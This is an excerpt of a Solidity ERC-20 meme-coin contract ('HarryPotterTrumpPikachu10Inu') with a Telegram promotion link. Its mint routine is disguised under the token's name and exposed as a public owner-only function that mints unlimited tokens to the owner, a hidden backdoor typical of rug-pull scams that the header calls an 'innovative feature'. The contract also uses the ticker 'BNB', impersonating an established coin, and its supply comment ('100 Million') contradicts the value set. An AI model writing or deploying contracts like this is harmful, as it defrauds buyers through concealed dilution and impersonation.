//
// $HarryPotterTrumpPikachu10Inu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/HPTP10l
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _HarryPotterTrumpPikachu10Inu(uint256 amount) public onlyOwner {
 _HarryPotterTrumpPikachu10Inu(msg.sender, amount);
    }
    ...
    function _HarryPotterTrumpPikachu10Inu(address account, uint256 amount) internal virtual {
...
contract $HarryPotterTrumpPikachu10Inu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("HarryPotterTrumpPikachu10Inu", "BNB") {
     _HarryPotterTrumpPikachu10Inu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}